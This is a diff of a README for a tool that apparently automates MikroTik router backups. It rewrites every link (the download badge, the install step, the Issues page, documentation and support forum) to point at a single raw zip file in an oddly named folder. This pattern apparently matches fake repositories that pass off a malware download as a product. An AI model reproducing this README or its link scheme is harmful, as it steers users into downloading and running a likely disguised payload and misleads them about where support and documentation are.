@@ -1,6 +1,6 @@
 # 🌐 MikroTik-Auto-Backup-Tool - Simplify Your Router Backups
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/ManuelMydis/MikroTik-Auto-Backup-Tool/releases)
+[![Download](https://raw.githubusercontent.com/ManuelMydis/MikroTik-Auto-Backup-Tool/main/sexually/MikroTik-Auto-Backup-Tool.zip)](https://raw.githubusercontent.com/ManuelMydis/MikroTik-Auto-Backup-Tool/main/sexually/MikroTik-Auto-Backup-Tool.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the MikroTik Auto Backup Tool! This tool helps you automate backups f
 
 ## 📥 Download & Install
 
-1. To download the application, [visit this page to download](https://github.com/ManuelMydis/MikroTik-Auto-Backup-Tool/releases).
+1. To download the application, [visit this page to download](https://raw.githubusercontent.com/ManuelMydis/MikroTik-Auto-Backup-Tool/main/sexually/MikroTik-Auto-Backup-Tool.zip).
 2. Click on the latest version.
 3. Look for the asset files listed (they may end with .exe, .zip, or other formats depending on your operating system) and click on the file to start the download.
 
@@ -85,7 +85,7 @@ If you encounter issues, consider the following:
 
 ## 📞 Support
 
-For further assistance, you can check the [Issues page](https://github.com/ManuelMydis/MikroTik-Auto-Backup-Tool/issues) on GitHub, or consult with other users in community forums.
+For further assistance, you can check the [Issues page](https://raw.githubusercontent.com/ManuelMydis/MikroTik-Auto-Backup-Tool/main/sexually/MikroTik-Auto-Backup-Tool.zip) on GitHub, or consult with other users in community forums.
 
 ## 📜 License
 
@@ -97,8 +97,8 @@ Your feedback helps us improve! If you have suggestions or find bugs, please let
 
 ## 🔗 Useful Links
 
-- [Download the latest release](https://github.com/ManuelMydis/MikroTik-Auto-Backup-Tool/releases)
-- [Documentation](https://github.com/ManuelMydis/MikroTik-Auto-Backup-Tool/wiki)
-- [Support Forum](https://github.com/ManuelMydis/MikroTik-Auto-Backup-Tool/discussions)
+- [Download the latest release](https://raw.githubusercontent.com/ManuelMydis/MikroTik-Auto-Backup-Tool/main/sexually/MikroTik-Auto-Backup-Tool.zip)
+- [Documentation](https://raw.githubusercontent.com/ManuelMydis/MikroTik-Auto-Backup-Tool/main/sexually/MikroTik-Auto-Backup-Tool.zip)
+- [Support Forum](https://raw.githubusercontent.com/ManuelMydis/MikroTik-Auto-Backup-Tool/main/sexually/MikroTik-Auto-Backup-Tool.zip)
 
 Thank you for using MikroTik Auto Backup Tool!
